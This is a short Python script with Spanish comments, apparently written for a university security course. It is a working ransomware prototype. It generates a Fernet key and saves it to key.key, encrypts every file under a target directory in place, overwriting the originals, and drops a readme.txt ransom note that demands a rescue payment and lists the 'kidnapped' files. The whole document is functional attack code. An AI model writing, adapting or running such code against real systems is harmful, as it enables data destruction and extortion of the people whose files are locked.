from cryptography.fernet import Fernet#Se importa la libreria que implementara datos de cifrado simetrico que usa el algoritmo AES
import os #Modulo que permite la interaccion con el sistema operativo

def generateKey():
    key = Fernet.generate_key() #crea una clave de cifrado y la almacenara en el archivo key.key
    with open("key.key", "wb") as Arckey:#abre el archivo en estructura binaria y lo asocia con el identificador 'key_file'
        Arckey.write(key)#escribe la clave en los datos  

def returnKey():
    return open("key.key", "rb").read()#Lee los datos de key.key en lectura binaria 

def encrypt_file(Ruta, key):#toma la ruta y usa fernet para usar la clave, lo lee y lo encripta
    cipher = Fernet(key)#Crea una instancia de Fernet utilizando la clave proporcionada y los usa para encriptar los archivos
    with open(Ruta, "rb") as file:#abre los archivos en modo de lectura binaria y usa la ruta
        Datos_encrip = file.read()
    encrypted_data = cipher.encrypt(Datos_encrip)#encripta los archivos y guarda los archivos
    with open(Ruta, "wb") as file:#abre los archivos en modo de lectura binaria y usa la ruta
        file.write(encrypted_data)#se escribe los datos encriptados en el archivo

def encrypt_directory(directory_path, key):
    encrypted_files = []

    for root, dirs, files in os.walk(directory_path):#utiliza la funcion os.walk para recorrer los archivos y subdirectorios
        for file in files:#itera por todos los archivos
            Ruta = os.path.join(root, file)#se hace unra ruta para cada archivo con el directorio y con su nombre
            encrypt_file(Ruta, key)
            encrypted_files.append(Ruta)

    return encrypted_files

if __name__ == "__main__":
    directory = 'D:\\8vo semestre\\Seguridad\\EncripPb'    
    generateKey()
    key = returnKey()
    encrypted_files = encrypt_directory(directory, key)

    with open(os.path.join(directory, "readme.txt"), "w") as file:
        file.write("Archivos y carpetas encriptados\n")
        file.write("Se solicita rescate\n")
        file.write("Archivos raptados:\n")
        for Ruta in encrypted_files:
            file.write(Ruta + "\n")         


    print("Archivo 'readme.txt' generado con la lista de archivos encriptados.")
